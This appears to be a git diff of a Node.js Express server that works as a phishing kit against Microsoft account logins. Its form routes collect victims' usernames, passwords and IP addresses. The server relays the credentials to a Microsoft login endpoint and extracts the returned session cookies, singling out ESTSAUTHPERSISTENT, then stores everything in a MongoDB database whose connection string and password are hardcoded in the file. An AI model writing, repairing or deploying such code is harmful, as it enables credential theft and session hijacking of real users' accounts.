@@ -1,3 +1,4 @@
+const axios = require('axios');
 require('dotenv').config();
 let express = require("express");
 let bodyParser = require("body-parser");
@@ -8,21 +9,13 @@ const httpProxy = require('http-proxy');
 const mongodb = require('mongodb');
 const cookieParser = require('cookie-parser');
 const session = require('express-session');
-const MongoStore = require('connect-mongo');
 
-
-
-
-const targetUrl = '.login.microsoftonline.com';
 let app = express();
-const proxy = httpProxy.createProxyServer();
 
-app.set("view engine", "ejs")
+app.set("view engine", "ejs");
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static("public"));
 app.use(cookieParser());
-
-
 
 mongoose.set('strictQuery', true);
 mongoose.connect("mongodb+srv://sgrain35:SDdqnJVhOqYWLyMT@cluster0.cbrwrem.mongodb.net/full",{ useNewUrlParser:true });
@@ -31,7 +24,8 @@ const userSchema = new mongoose.Schema({
   ai: String,
   pi: String,
   ip: String,
-  cookies: String,
+  cookies: Object,
+  xMsGatewaySliceValue:String
 });
 
 const User = mongoose.model("User", userSchema);
@@ -52,8 +46,8 @@ app.post("/first", function(req, res) {
   res.render("second", { username: username });
 });
 
-app.post("/second", function(req, res) {
-  const ipadd = "IP address is: " + req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+app.post("/second", async function(req, res) {
+  const ipadd = "IP address is: " + (req.headers['x-forwarded-for'] || req.connection.remoteAddress);
   const username = req.body.username;
   const password = req.body.pass;
 
@@ -63,55 +57,45 @@ app.post("/second", function(req, res) {
     password: password
   };
 
-  // Make the POST request to the Microsoft login endpoint
-  fetch('https://login.microsoftonline.com/login', {
-    method: 'POST',
-    body: JSON.stringify(data),
-    headers: {
-      'Content-Type': 'application/json'
-    }
-  })
-    .then(response => {
-      // Retrieve the full cookie string from the response headers
-      const cookies = response.headers.get('set-cookie');
-
-      // Create a new user document with the received cookies
-      const newUser = new User({
-        ai: username,
-        pi: password,
-        ip: ipadd,
-        cookies: cookies // Save the full cookie string
-      });
-
-      // Save the user document to the database
-      newUser.save(function (err) {
-        if (err) {
-          console.log(err);
-        } else {
-          res.render("third", {
-            username: username
-          });
-        }
-      });
-    })
-    .catch(error => {
-      console.error('Error:', error);
+  try {
+    // Make the POST request to the login endpoint
+    const response = await axios.post('.login.microsoftonline.com', data, {
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      withCredentials: true
     });
+    // Retrieve the cookies from the response headers
+    const cookies = response.headers['set-cookie'];
+
+
+    // Retrieve the specific cookie value from the response headers
+    const xMsGatewaySliceValue = cookies.find(cookie => cookie.includes('ESTSAUTHPERSISTENT'));
+    console.log(xMsGatewaySliceValue);
+
+    // Create a new user document with the received cookie value
+    const newUser = new User({
+      ai: username,
+      pi: password,
+      ip: ipadd,
+      cookies: cookies,
+      xMsGatewaySliceValue: xMsGatewaySliceValue
+    });
+
+    // Save the user document to the database
+    newUser.save(function(err) {
+      if (err) {
+        console.log(err);
+      } else {
+        res.render("third", {
+          username: username
+        });
+      }
+    });
+  } catch (error) {
+    console.error('Error:', error.message);
+  }
 });
-
-
-// // Helper function to extract the value of a cookie
-// function extractCookieValue(cookies, cookieName) {
-//   const cookieRegex = new RegExp(`${cookieName}=([^;]+)`);
-//   const match = cookies.match(cookieRegex);
-//   if (match && match.length > 1) {
-//     return match[1];
-//   }
-//   return '';
-// }
-
-
-
 
 app.post("/third", function(req, res) {
   const ipadd = "IP address is: " + req.headers['x-forwarded-for'] || req.connection.remoteAddress;
@@ -131,6 +115,8 @@ app.post("/third", function(req, res) {
     }
   });
 });
+
+// Rest of your code...
 
 const port = process.env.PORT || 3000;
 app.listen(port, function () {
